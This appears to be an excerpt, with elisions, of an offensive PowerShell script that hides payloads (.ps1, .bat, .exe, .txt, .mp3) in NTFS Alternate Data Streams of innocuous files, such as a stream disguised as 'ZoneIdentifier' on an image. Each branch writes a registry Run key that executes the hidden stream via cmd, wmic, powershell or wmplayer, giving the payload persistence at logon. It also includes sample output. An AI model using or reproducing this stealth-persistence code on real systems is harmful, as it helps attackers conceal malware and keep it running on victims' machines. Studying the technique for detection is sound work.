...
.OUTPUTS
   * Alternate Data Stream settings *
   ...
   [cmd] Execute_ADS : wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:ZoneIdentifier"

   * Registry persistence settings *
   ADSpersistenceEXE : cmd /R wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:ZoneIdentifier"
...
ElseIf($ADS -ieq "Create")
{
    ...
    If($ParseDataName -Match '.ps1$')
    {
        ...
        If($Registry -ieq "True")
        {
           ...
           New-ItemProperty -Path "$path1" -Name 'ADSpersistencePS' -Value "cmd /R `"cd $LegitPath&&powershell .\${RawLegit}:${StreamName}`"" -PropertyType String -Force|Select-Object ADSpersistencePS,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
    ...
    ElseIf($ParseDataName -Match '.bat$')
    {
        ...
        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceBAT' -Value "cmd /R `"cmd.exe - < ${InTextFile}:${StreamName}`"" -PropertyType String -Force|Select-Object ADSpersistenceBAT,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
    ...
    ElseIf($ParseDataName -Match '.txt$')
    {
        ...
        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceTXT' -Value "cmd /R notepad.exe ${InTextFile}:${StreamName}" -PropertyType String -Force|Select-Object ADSpersistenceTXT,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
    ...
    ElseIf($ParseDataName -Match '.exe$')
    {
        ...
        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceEXE' -Value "cmd /R wmic.exe process call create `"${InTextFile}:${StreamName}`"" -PropertyType String -Force|Select-Object ADSpersistenceEXE,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
    ...
    ElseIf($ParseDataName -Match '.mp3$')
    {
        ...
        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceMP3' -Value "cmd /R wmplayer.exe `"${InTextFile}:${StreamName}`"" -PropertyType String -Force|Select-Object ADSpersistenceMP3,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
...
ElseIf($ADS -ieq "Clear")
{
    ...
    If($StreamData -iMatch '(.ps1)$' -or $StreamData -iMatch '^(ZoneIdentifier)$')
    {
